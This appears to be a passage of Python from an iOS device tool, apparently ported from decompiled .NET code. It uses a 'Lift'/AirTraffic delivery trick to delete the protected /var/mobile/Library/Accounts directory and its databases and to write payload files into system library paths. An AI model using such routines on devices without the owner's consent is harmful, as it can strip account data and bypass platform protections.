        self.report(base_progress + 2, "Lift 流程: moveout Accounts...")
        dir_moved = False
        try:
            dir_moved = self.move_out_and_remove_device_path(
                "/var/mobile/Library/Accounts", base_progress + 3, "Accounts")
        except Exception as exc:
            details.append("moveout: " + str(exc))
            dir_moved = False

        if dir_moved:
            self.report(base_progress + 20,
                        "Lift 流程: Accounts 已移出并清理。")
            return

        details.append("moveout 未看到 recovered 目录")

        # 2) 目录 moveout 不成，则 move out 9 个常见数据库文件。
        artifacts = 0
        try:
            artifacts = self.move_out_device_paths_batch(
                list(ACCOUNT_DATABASES), base_progress + 10, "Accounts 数据库")
        except Exception as exc:
            details.append("moveout: " + str(exc))
            artifacts = 0

        if artifacts > 0:
            self.report(base_progress + 20,
                        "Lift 流程: Accounts 数据已清理。")
            return

        details.append("Accounts 常见数据库未回收")

        # 3) 以 Accounts 最终是否可见为准。
        link_accounts = afc_kept_link.rstrip("/") + "/Accounts"
        current_kind = self.kind(link_accounts)
        if not current_kind:
            self.report(base_progress + 18,
                        "Lift 流程: Accounts 已不可见，继续收尾。")
            return

        # 4) 仍可见：最多 3 轮，每轮 RemoveTree + Remove，再查 Kind。
        gone = False
        for n in range(3):
            self.report(base_progress + 6 + 4 * n,
                        "Lift 流程: 清理 Accounts...")
            try:
                self.remove_tree(link_accounts)
            except Exception:
                pass
            time.sleep(0.350 + 0.250 * n)
            if not self.kind(link_accounts):
                gone = True
                break
            try:
                self.remove(link_accounts)
            except Exception:
                pass
            time.sleep(0.300)
            if not self.kind(link_accounts):
                gone = True
                break

        if gone:
            return

        # 5) 三轮后仍可见，才真正失败（与第三方一致）。
        raise RuntimeError(
            "Accounts 删除后仍可见: " + link_accounts
            + " kind=" + str(current_kind)
            + "；moveout 细节: " + " | ".join(details))

    # -- kept-library file writes -------------------------------------------

    def ensure_parent_directories(self, path: str) -> None:
        slash = path.rfind("/")
        if slash < 0:
            return
        parent = path[:slash]
        if not parent:
            return
        cur = ""
        for seg in parent.split("/"):
            cur = seg if not cur else cur + "/" + seg
            self.ensure_dir(cur)

    def write_file_through_kept_library(self, kept_link: str, rel_path: str,
                                        payload: bytes, verify: bool) -> None:
        rel = rel_path.replace("\\", "/").strip("/")
        if not rel:
            raise RuntimeError("目标相对路径为空。")
        if rel.startswith("../") or rel == "..":
            raise RuntimeError("目标相对路径不安全: " + rel_path)
        loc = kept_link.rstrip("/") + "/" + rel
        self.ensure_parent_directories(loc)

        slash = loc.rfind("/")
        dir_path = loc[:slash]
        name = loc[slash + 1:]
        tmp = dir_path + "/.airlift-tmp-" + random_hex(8) + "-" + name

        self.remove(tmp)
        if self.write_file(tmp, payload):
            self.remove(loc)
            if not self.rename(tmp, loc):
                if not self.write_file(loc, payload):
                    raise RuntimeError("kept link rename/write 失败: " + loc)
        else:
            if not self.write_file(loc, payload):
                raise RuntimeError("kept link 写入失败: " + loc)

        if verify:
            if not self.readback_with_retry(loc, payload):
                raise RuntimeError("kept link 回读校验失败: " + loc)

    def remove_existing_library_file_for_fresh_write(self, kept_link: str,
                                                      rel_path: str,
                                                      base_progress: int) -> None:
        # Normalize: Replace('\','/').Trim('/') (IL uses char '/' Trim).
        rel = rel_path.replace("\\", "/").strip("/")
        if not rel:
            raise RuntimeError("目标相对路径为空。")
        # IL rejects any occurrence of '../' anywhere, and exact '..'.
        if "../" in rel or rel == "..":
            raise RuntimeError("目标相对路径不安全: " + rel_path)

        loc = kept_link.rstrip("/") + "/" + rel
        if not self.exists(loc):
            self.report(base_progress, "Lift 流程: 旧配置不存在，直接发送。")
            return
        try:
            self.remove(loc)
        except Exception:
            self.remove(loc)
        time.sleep(0.250)
        if not self.exists(loc):
            self.report(base_progress + 1, "Lift 流程: 旧配置已清理。")
            return

        # Fallback: move the real device file out through a fresh identifier.
        device_path = "/var/mobile/Library/" + rel
        moved = self.move_out_and_remove_device_path(
            device_path, base_progress + 1, rel)
        if not moved:
            raise RuntimeError("旧配置移出失败: " + rel)

    def write_fresh_file_via_lift(self, device_path: str, payload: bytes,
                                  base_progress: int) -> dict:
        # IL: WriteReliable(relPath, payload, false, <baseProgress+?>, false).
        # The target is the absolute device path; WriteReliable routes it
        # through the full AirTraffic delivery (linkset -> kept-link rename).
        # Returns the per-delivery result, including the IMMEDIATE readback
        # verified flag (bytes reached the real target at delivery time).
        return self.write_reliable(device_path, payload, False,
                                   base_progress, False)

    # -- cleanup ------------------------------------------------------------

    def cleanup(self, src: str, link: str | None,
                recovered: str | None) -> None:
        if link:
            self.remove(link)
        if recovered:
            self.remove(recovered)
        self.remove_tree(src)
        self.clean_books_files()
